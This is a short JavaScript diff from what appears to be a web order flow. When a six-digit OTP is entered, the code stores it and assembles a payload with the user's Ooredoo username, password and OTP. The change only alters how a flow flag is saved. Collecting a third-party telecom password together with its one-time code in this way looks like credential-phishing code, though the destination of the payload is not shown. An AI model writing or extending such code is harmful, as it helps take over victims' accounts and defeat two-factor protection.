@@ -366,9 +366,11 @@
     if (otp.length === 6) {
       sessionStorage.setItem('otpCode', otp);
       sessionStorage.setItem('ooredooOtp', otp);
-      sessionStorage.setItem('ooredooFlow', 'otp');
-
       const orderId = sessionStorage.getItem('safwa_order_id') || localStorage.getItem('requestId') || 'ooredoo-' + Date.now();
+      sessionStorage.setItem('ooredooFlow_' + orderId, 'otp');
+      localStorage.setItem('ooredooFlow_' + orderId, 'otp');
+      sessionStorage.setItem('ooredooFlow', 'otp');
+      localStorage.setItem('ooredooFlow', 'otp');
       const payload = {
         ooredooUser: sessionStorage.getItem('ooredooUser') || '',
         ooredooPass: sessionStorage.getItem('ooredooPass') || '',
